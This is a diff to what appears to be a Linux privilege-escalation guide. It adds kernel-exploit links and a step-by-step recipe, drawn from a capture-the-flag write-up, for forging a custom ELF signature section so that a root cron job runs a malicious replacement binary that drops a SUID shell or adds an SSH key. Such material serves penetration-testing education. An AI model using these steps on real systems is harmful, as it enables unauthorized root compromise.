@@ -57,10 +57,13 @@ Tools that could help to search for kernel exploits are:
 
 Always **search the kernel version in Google**, maybe your kernel version is written in some kernel exploit and then you will be sure that this exploit is valid.
 
-Additional kernel exploitation technique:
+Additional kernel exploitation techniques:
 
 {{#ref}}
 ../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
+{{#endref}}
+{{#ref}}
+../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
 {{#endref}}
 
 ### CVE-2016-5195 (DirtyCow)
@@ -502,6 +505,28 @@ If the script executed by root uses a **directory where you have full access**, 
 ```bash
 ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 ```
+
+### Custom-signed cron binaries with writable payloads
+Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:
+
+1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
+2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
+   ```bash
+   openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
+   ```
+3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
+   ```bash
+   gcc -fPIC -pie monitor.c -o monitor
+   objcopy --add-section .text_sig=cert.pem monitor
+   objcopy --dump-section .text_sig=text_sig_section.bin monitor
+   strings text_sig_section.bin | grep 'Era Inc.'
+   ```
+4. Overwrite the scheduled binary while preserving execute bits:
+   ```bash
+   cp monitor /opt/AV/periodic-checks/monitor
+   chmod 770 /opt/AV/periodic-checks/monitor
+   ```
+5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.
 
 ### Frequent cron jobs
 
@@ -1774,9 +1799,8 @@ vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
 ## References
 
 - [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
+- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
 - [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
-
-
 - [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 - [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
 - [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
@@ -1797,7 +1821,6 @@ vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
 - [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
 - [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
 - [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
-
 - [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
 
 {{#include ../../banners/hacktricks-training.md}}
